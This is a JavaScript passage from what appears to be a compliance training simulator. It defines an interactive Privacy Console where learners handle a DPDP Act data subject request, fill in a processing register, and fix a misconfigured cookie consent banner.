  body.addEventListener("click", e => { const t = e.target.closest("[data-gtab],[data-gev],[data-gpub],[data-gheat],[data-vflag],[data-vreveal],[data-vdec]"); if (!t) return; const d = t.dataset;
    if (d.gtab) { tab = d.gtab; note = ""; draw(); return; }
    if (d.gev) { open = open === d.gev ? null : d.gev; draw(); return; }
    if (d.gpub) { if (!grcIssOk(st)) { note = "Before publishing: every ineffective control needs an issue, and every result must match the evidence."; draw(); return; } st.published = true; note = ""; return after(); }
    if (d.gheat) { st.heatOpen = !st.heatOpen; if (st.heatOpen) st.heat = true; return after(); }
    if (d.vflag) { st.vflag[d.vflag] = !st.vflag[d.vflag]; return after(); }
    if (d.vreveal) { st.vreveal = !st.vreveal; draw(); return; }
    if (d.vdec) { st.vdec = d.vdec; return after(); }
  });
  draw();
  return {onArgs: a => { const t = opTabFor("grc", a.op); if (t) { tab = t; draw(); } }};
}});

/* ---------- Privacy Console (OneTrust-style: DSAR, data map, cookie consent) ---------- */
const DSR_ID = [["aadhaar","Ask her to upload copies of her Aadhaar and PAN",false,"That collects more personal data than you need, and copies of ID documents become a new risk to protect. Verify with what you already hold."],["otp","Send a one-time code to the email or phone already on her account",true,"Right: you confirm it's really her using data you already hold, without collecting more."],["none","Skip checks and send the data to the address in the form",false,"If it's an impostor, handing over her data is itself a breach."]];
const DSR_SYS = [
 {id:"crm", n:"CRM", found:"1 profile: name, email, phone, delivery address", act:"include"},
 {id:"billing", n:"Billing", found:"14 invoices (2023–2026)", act:"retain", why:"Invoices are tax records: GST law requires them to be kept for about six years, so they stay. Tell her they exist and why they're kept."},
 {id:"mkt", n:"Email marketing", found:"Subscribed; 37 campaign opens and clicks", act:"erase"},
 {id:"support", n:"Support desk", found:"3 tickets", act:"include"},
 {id:"ads", n:"Ad-targeting audience", found:"Her email (hashed) in the 'past buyers' audience", act:"erase", why:"This is marketing data too, so it goes, and hashing doesn't make it non-personal."},
 {id:"hr", n:"HR system", found:"No records (she's a customer, not an employee)", act:"none"}
];
const DSR_ACTS = [["include","Include in her summary"],["erase","Erase (she asked)"],["retain","Keep: the law requires it (tell her why)"],["none","No data held"]];
const DSR_DL = [["90","Within the response time we publish, and never more than 90 days (DPDP Rules 2025)",true],["30","One month (that's GDPR's default, not India's)",false],["72h","72 hours (that's a breach-reporting deadline)",false],["none","There's no deadline",false]];
const ROPA = [
 {id:"pay", n:"Payroll", data:"Name, PAN, bank account, salary", g:"legit", hr:true, xb:false, note:"Employment is a 'legitimate use' under section 7 of the DPDP Act, so consent isn't the basis."},
 {id:"news", n:"Marketing newsletter", data:"Name, email, click history", g:"consent", hr:false, xb:false, note:"Marketing needs consent, which must be as easy to withdraw as to give."},
 {id:"orders", n:"Customer orders and delivery", data:"Name, phone, address, items bought", g:"legit", hr:false, xb:false, note:"The customer gave the data voluntarily for this purpose (section 7(a)): a legitimate use."},
 {id:"chat", n:"Support chat (vendor hosted in the USA)", data:"Name, email, chat transcripts", g:"legit", hr:false, xb:true, note:"Data shared to get support is a legitimate use, but it leaves India: record the transfer and check the country isn't restricted."},
 {id:"cookies", n:"Website analytics cookies", data:"Device ID, pages visited", g:"consent", hr:false, xb:false, note:"Non-essential cookies need consent."}
];
const CK = [
 {id:"session_id", by:"kavach.in", exp:"When the browser closes", what:"Keeps you signed in", cat:"necessary"},
 {id:"csrf_token", by:"kavach.in", exp:"When the browser closes", what:"Protects forms from cross-site request forgery", cat:"necessary"},
 {id:"lang", by:"kavach.in", exp:"1 year", what:"Remembers your language", cat:"functional"},
 {id:"_ga", by:"Google Analytics", exp:"2 years", what:"Counts visits and how people use the site", cat:"analytics"},
 {id:"_hjSessionUser", by:"Hotjar", exp:"1 year", what:"Records how visitors move around pages", cat:"analytics"},
 {id:"_fbp", by:"Meta Pixel", exp:"3 months", what:"Tracks visitors for advertising", cat:"marketing"}
];
const CK_CATS = [["necessary","Strictly necessary"],["functional","Functional"],["analytics","Analytics"],["marketing","Marketing"]];
const CK_OPTS = [["defFunc","Functional cookies ON by default",false],["defAna","Analytics cookies ON by default",false],["defMkt","Marketing cookies ON by default",false],["reject1","'Reject all' button on the first screen",true],["equal","'Accept all' and 'Reject all' look the same (size and colour)",true],["wall","Block the site until the visitor accepts",false],["notice","Link to the privacy notice in the banner",true],["log","Keep a record of each consent (when, what, banner version)",true]];
const CK_BAD = {defFunc:true, defAna:true, defMkt:true, reject1:false, equal:false, wall:true, notice:false, log:false};
const dsrActOk = st => DSR_SYS.every(s => ((st.dsr || {}).act || {})[s.id] === s.act);
const ropaAdded = st => ROPA.every(r => !!(st.map || {})[r.id]);
const ropaG = st => ropaAdded(st) && ROPA.every(r => st.map[r.id].g === r.g);
const ropaHr = st => ropaAdded(st) && ROPA.every(r => !!st.map[r.id].hr === r.hr);
const ropaXb = st => ropaAdded(st) && ROPA.every(r => !!st.map[r.id].xb === r.xb);
const ckClassOk = st => !!st.ckScan && CK.every(c => (st.ck || {})[c.id] === c.cat);
const ckOpt = (st, k) => (st.ckopt || CK_BAD)[k];
const ckDefOk = st => !!st.ckScan && !ckOpt(st, "defFunc") && !ckOpt(st, "defAna") && !ckOpt(st, "defMkt");
const ckEqOk = st => !!st.ckScan && ckOpt(st, "reject1") && ckOpt(st, "equal") && !ckOpt(st, "wall");
const ckPubOk = st => !!st.ckPub && ckOpt(st, "notice") && ckOpt(st, "log") && ckDefOk(st) && ckEqOk(st) && ckClassOk(st);
losRegister({id:"privacy", title:"Privacy Console", icon:"🛡", color:"#9D174D", size:[1020,660], mount(body, ctx, args){
  const st = ctx.st; st.dsr ||= {act:{}}; st.dsr.act ||= {}; st.map ||= {}; st.ck ||= {}; st.ckopt ||= Object.assign({}, CK_BAD);
  let tab = opTabFor("privacy", args.op) || "dsr", searching = 0, note = "", prefs = false;
  const dsrView = () => { const D = st.dsr;
    return `<div class="card inset"><div class="row between"><b>DSR-1042 · Riya Sharma</b><span class="pill acc">Access + erasure</span></div><p class="num">Received 20 Oct 2026 through the web form. Customer in Pune, so the DPDP Act applies.</p><blockquote>"Please tell me what personal data you hold about me, and delete my data that you use for marketing."</blockquote></div>
    <ol class="dsrsteps">
      <li class="${D.id ? "done" : ""}"><b>Verify her identity</b>${DSR_ID.map(([k, l, ok, why]) => `<label class="chk"><input type="radio" name="dsrid" data-dsrid="${k}" ${D.id===k?"checked":""}> ${esc(l)}</label>${D.id === k ? `<span class="num ${ok ? "" : "warnc"}">${esc(why)}</span>` : ""}`).join("")}</li>
      <li class="${D.searched ? "done" : ""}"><b>Find her data in every system</b><div class="row"><button class="btn sm" data-dsrsearch="1" ${searching ? "disabled" : ""}>${searching ? "Searching " + searching + "/6…" : D.searched ? "Search again" : "Search all systems"}</button><span class="num">Searches the systems listed in the data map.</span></div>
        ${D.searched || searching ? `<div class="tblwrap"><table class="tbl"><thead><tr><th>System</th><th>What we found</th><th>Action</th></tr></thead><tbody>${DSR_SYS.map((s, i) => (D.searched || i < searching) ? `<tr><td><b>${esc(s.n)}</b></td><td>${esc(s.found)}</td><td><select data-dsract="${s.id}" aria-label="Action for ${esc(s.n)}"><option value="">Choose…</option>${DSR_ACTS.map(([k, l]) => `<option value="${k}" ${D.act[s.id]===k?"selected":""}>${esc(l)}</option>`).join("")}</select>${D.act[s.id] && D.act[s.id] !== s.act ? `<span class="num warnc">Re-read her request and what's held here.</span>` : D.act[s.id] && s.why ? `<span class="num">${esc(s.why)}</span>` : ""}</td></tr>` : "").join("")}</tbody></table></div>` : ""}</li>
      <li class="${D.sent ? "done" : ""}"><b>Reply within the deadline</b>${DSR_DL.map(([k, l, ok]) => `<label class="chk"><input type="radio" name="dsrdl" data-dsrdl="${k}" ${D.dl===k?"checked":""}> ${esc(l)}</label>`).join("")}
        <div class="row"><button class="btn sm" data-dsrsend="1">Send response and close the request</button></div>${D.sent ? `<div class="info">Closed. Response sent with her data summary, the marketing data erased, and an explanation of what the law makes us keep. Logged for audit.</div>` : ""}${note ? `<div class="note">${esc(note)}</div>` : ""}</li></ol>`; };
  const mapView = () => `<p class="num">Data discovery found 5 processing activities that aren't in the Record of Processing yet. Add each one, then record its DPDP ground (consent, or a 'legitimate use' under section 7), whether it holds high-risk financial or ID data, and whether data leaves India.</p>
    <div class="tblwrap"><table class="tbl"><thead><tr><th>Activity</th><th>Data</th><th>Ground</th><th>High-risk data</th><th>Leaves India</th></tr></thead><tbody>${ROPA.map(r => { const x = st.map[r.id]; return `<tr><td><b>${esc(r.n)}</b></td><td class="num">${esc(r.data)}</td>${x ? `<td><select data-mg="${r.id}" aria-label="Ground for ${esc(r.n)}"><option value="">Choose…</option><option value="consent" ${x.g==="consent"?"selected":""}>Consent</option><option value="legit" ${x.g==="legit"?"selected":""}>Legitimate use (s.7)</option></select>${x.g && x.g !== r.g ? `<span class="num warnc">Think about why the data is collected.</span>` : x.g ? `<span class="num">${esc(r.note)}</span>` : ""}</td><td><input type="checkbox" data-mhr="${r.id}" ${x.hr?"checked":""} aria-label="High-risk data"></td><td><input type="checkbox" data-mxb="${r.id}" ${x.xb?"checked":""} aria-label="Leaves India"></td>` : `<td colspan="3"><button class="btn sm ghost" data-madd="${r.id}">+ Add to register</button></td>`}</tr>`; }).join("")}</tbody></table></div>
    <div class="row"><span class="num">${Object.keys(st.map).length}/5 in the register${ropaAdded(st) ? ` · grounds ${ropaG(st) ? "✓" : "…"} · high-risk ${ropaHr(st) ? "✓" : "…"} · transfers ${ropaXb(st) ? "✓" : "…"}` : ""}</span></div>`;
  const ckBanner = () => { const o = st.ckopt;
    return `<div class="site ${o.wall ? "walled" : ""}"><div class="sitebar"><b>kavach.in</b><span class="num">Home · Products · Contact</span></div><div class="sitebody"><div class="ph"></div><div class="ph short"></div><div class="ph"></div></div>
      <div class="cbanner"><b>We use cookies</b><p>We use cookies to run this site and, if you agree, to measure visits and show you relevant ads.${o.notice ? ` <a href="#" class="cklink">Read our privacy notice</a>.` : ""}</p>
        <div class="row"><button class="cbtn pri">Accept all</button>${o.reject1 ? `<button class="cbtn ${o.equal ? "pri" : "weak"}">Reject all</button>` : ""}<button class="cbtn ${o.equal ? "sec" : "weak"}" data-ckprefs="1">Manage preferences</button></div>
        ${prefs ? `<div class="cprefs">${CK_CATS.map(([k, l]) => { const on = k === "necessary" ? true : o[{functional:"defFunc", analytics:"defAna", marketing:"defMkt"}[k]]; return `<div class="row between"><span>${l}${k === "necessary" ? " (always on)" : ""}</span><span class="switch ${on ? "on" : ""}"><span></span></span></div>`; }).join("")}</div>` : ""}</div>${o.wall ? `<div class="wallnote">The site is blocked until you accept</div>` : ""}</div>`; };
  const ckView = () => `<p class="num">The website's cookie banner was set up badly. Scan the site, classify every cookie, then fix the banner so consent is free, informed and as easy to refuse as to give.</p>
    <div class="grid2"><div><div class="row"><button class="btn sm" data-ckscan="1">${st.ckScan ? "Rescan site" : "Scan kavach.in for cookies"}</button></div>
      ${st.ckScan ? `<div class="tblwrap"><table class="tbl"><thead><tr><th>Cookie</th><th>Set by</th><th>Purpose · expiry</th><th>Category</th></tr></thead><tbody>${CK.map(c => `<tr><td><code>${esc(c.id)}</code></td><td class="num">${esc(c.by)}</td><td class="num">${esc(c.what)} · ${esc(c.exp)}</td><td><select data-ckc="${c.id}" aria-label="Category for ${esc(c.id)}"><option value="">Classify…</option>${CK_CATS.map(([k, l]) => `<option value="${k}" ${st.ck[c.id]===k?"selected":""}>${l}</option>`).join("")}</select>${st.ck[c.id] && st.ck[c.id] !== c.cat ? `<span class="num warnc">Is the site unusable without it?</span>` : ""}</td></tr>`).join("")}</tbody></table></div>` : ""}
      <div class="card inset"><b>Banner settings</b>${CK_OPTS.map(([k, l]) => `<label class="chk"><input type="checkbox" data-cko="${k}" ${st.ckopt[k]?"checked":""}> ${esc(l)}</label>`).join("")}
        <div class="row"><button class="btn sm" data-ckpub="1">Publish banner</button></div>${st.ckPub && ckPubOk(st) ? `<div class="info">Published: non-essential cookies stay off until the visitor opts in, refusing is one click, and every choice is recorded as proof of consent.</div>` : ""}${note ? `<div class="note">${esc(note)}</div>` : ""}</div></div>
    <div><span class="num">Live preview</span>${ckBanner()}</div></div>`;
  const draw = () => { body.innerHTML = `<div class="apppad"><div class="snbar pv"><b>Privacy</b><span class="num">${tab === "dsr" ? "Data subject requests" : tab === "map" ? "Data mapping (RoPA)" : "Cookie consent"}</span></div>${opStrip("privacy", tab)}${appTabs([["dsr","Requests (DSAR)"],["map","Data map"],["ck","Cookie consent"]], tab, "ptab")}${tab === "dsr" ? dsrView() : tab === "map" ? mapView() : ckView()}</div>`; };
  const after = () => { ctx.save(); ctx.check(); draw(); };
  body.addEventListener("change", e => { const t = e.target, d = t.dataset;
    if (d.dsrid) { st.dsr.id = d.dsrid; st.dsr.idOk = d.dsrid === "otp"; return after(); }
    if (d.dsract) { st.dsr.act[d.dsract] = t.value; return after(); }
    if (d.dsrdl) { st.dsr.dl = d.dsrdl; st.dsr.sent = false; return after(); }
    if (d.mg) { st.map[d.mg].g = t.value; return after(); }
    if (d.mhr) { st.map[d.mhr].hr = t.checked; return after(); }
    if (d.mxb) { st.map[d.mxb].xb = t.checked; return after(); }
    if (d.ckc) { st.ck[d.ckc] = t.value; return after(); }
    if (d.cko) { st.ckopt[d.cko] = t.checked; st.ckPub = false; return after(); }
  });
  body.addEventListener("click", e => { const t = e.target.closest("[data-ptab],[data-dsrsearch],[data-dsrsend],[data-madd],[data-ckscan],[data-ckpub],[data-ckprefs],.cklink,.cbtn"); if (!t) return; const d = t.dataset;
    if (t.classList.contains("cklink") || (t.classList.contains("cbtn") && !d.ckprefs)) { e.preventDefault(); return; }
    if (d.ptab) { tab = d.ptab; note = ""; draw(); return; }
    if (d.dsrsearch) { if (searching) return; searching = 1; st.dsr.searched = false; draw(); const tick = () => { if (searching >= DSR_SYS.length) { searching = 0; st.dsr.searched = true; after(); return; } searching++; draw(); setTimeout(tick, 260); }; setTimeout(tick, 260); return; }
    if (d.dsrsend) { const D = st.dsr; note = D.id !== "otp" ? "Verify her identity the right way first." : !D.searched ? "Search every system first." : !dsrActOk(st) ? "Choose the right action for each system first." : D.dl !== "90" ? "Check the deadline: which law applies to a customer in Pune?" : ""; if (!note) { D.sent = true; logActivity(1); } return after(); }
    if (d.madd) { st.map[d.madd] = {g:"", hr:false, xb:false}; return after(); }
    if (d.ckscan) { st.ckScan = true; return after(); }
    if (d.ckprefs) { prefs = !prefs; draw(); return; }
    if (d.ckpub) { note = !ckClassOk(st) ? "Classify every cookie correctly first." : !ckDefOk(st) ? "Non-essential cookies are still switched on by default." : !ckEqOk(st) ? "Refusing must be as easy as accepting, without blocking the site." : !(ckOpt(st, "notice") && ckOpt(st, "log")) ? "Link the privacy notice and keep consent records: you'll need to prove consent later." : ""; st.ckPub = !note; return after(); }
  });
  draw();
  return {onArgs: a => { const t = opTabFor("privacy", a.op); if (t) { tab = t; draw(); } }};
}});
